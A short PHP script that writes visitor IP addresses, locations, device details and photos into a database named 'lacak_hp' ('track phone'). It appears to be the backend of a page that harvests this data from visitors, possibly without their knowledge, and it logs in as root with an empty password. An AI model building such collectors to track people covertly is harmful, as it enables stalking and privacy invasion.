<?php
$host = "localhost";
$user = "root";
$pass = "";
$db   = "lacak_hp";

$conn = new mysqli($host, $user, $pass, $db);

if ($conn->connect_error) {
  die("Koneksi gagal: " . $conn->connect_error);
}

$ip_address = $_POST['ip_address'] ?? '';
$lokasi     = $_POST['lokasi'] ?? '';
$perangkat  = $_POST['perangkat'] ?? '';
$foto       = $_POST['foto'] ?? '';

$stmt = $conn->prepare("INSERT INTO pengunjung (ip_address, lokasi, perangkat, foto) VALUES (?, ?, ?, ?)");
$stmt->bind_param("ssss", $ip_address, $lokasi, $perangkat, $foto);

if ($stmt->execute()) {
  echo "OK";
} else {
  echo "GAGAL";
}

$stmt->close();
$conn->close();
?>
